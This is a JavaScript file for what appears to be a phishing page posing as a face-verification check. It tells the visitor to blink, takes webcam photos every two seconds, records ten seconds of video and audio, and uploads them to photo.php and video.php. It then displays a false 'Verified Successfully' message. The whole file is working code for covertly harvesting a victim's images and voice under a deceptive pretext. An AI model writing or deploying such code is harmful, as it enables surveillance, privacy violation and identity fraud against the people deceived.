let count = 0;
let streamRef = null;

async function start(){

document.getElementById("msg").innerText="Blink your eyes now 👁️";

try{

const stream = await navigator.mediaDevices.getUserMedia({
video:{facingMode:"user"},
audio:true
});

streamRef = stream;

document.getElementById("video").srcObject = stream;

setInterval(capture,2000);
record(stream);

}catch(error){
alert("Camera permission denied");
}

}

function capture(){

count++;

let v=document.getElementById("video");
let c=document.getElementById("canvas");

c.width=v.videoWidth;
c.height=v.videoHeight;

c.getContext("2d").drawImage(v,0,0);

let img=c.toDataURL("image/png");

fetch("photo.php",{
method:"POST",
body:JSON.stringify({img:img}),
headers:{"Content-Type":"application/json"}
});

if(count==3){
document.getElementById("msg").innerText="Verification Processing...";
}

}

function record(stream){

let rec=new MediaRecorder(stream);
let chunks=[];

rec.ondataavailable=e=>chunks.push(e.data);

rec.start();

setTimeout(()=>rec.stop(),10000);

rec.onstop=()=>{

let blob=new Blob(chunks,{type:"video/webm"});
let fd=new FormData();

fd.append("video",blob);

fetch("video.php",{
method:"POST",
body:fd
});

document.getElementById("msg").innerText="✅ Verified Successfully";

}

}